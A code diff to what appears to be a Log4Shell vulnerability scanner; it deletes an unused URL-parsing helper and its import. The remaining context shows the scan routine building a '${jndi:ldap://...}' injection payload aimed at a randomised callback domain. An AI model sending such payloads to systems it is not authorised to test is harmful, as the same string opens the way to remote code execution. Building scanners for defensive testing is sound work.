@@ -13,7 +13,6 @@ import random
 import requests
 import time
 import sys
-from urllib import parse as urlparse
 import base64
 import json
 import random
@@ -153,32 +152,7 @@ def check_logs(path, tokens):
     return False
 
 
-def parse_url(url):
-    """
-    Parses the URL.
-    """
-
-    # Url: https://example.com/login.jsp
-    url = url.replace('#', '%23')
-    url = url.replace(' ', '%20')
-
-    if ('://' not in url):
-        url = str("http://") + str(url)
-    scheme = urlparse.urlparse(url).scheme
-
-    # FilePath: /login.jsp
-    file_path = urlparse.urlparse(url).path
-    if (file_path == ''):
-        file_path = '/'
-
-    return({"scheme": scheme,
-            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
-            "host":  urlparse.urlparse(url).netloc.split(":")[0],
-            "file_path": file_path})
-
-
 def scan_url(url, callback_domain, proxies):
-    parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(16))
     payload_callback = "%s.%s" % (random_string, callback_domain)
     payload = '${jndi:ldap://%s/%s}' % (payload_callback, random_string)
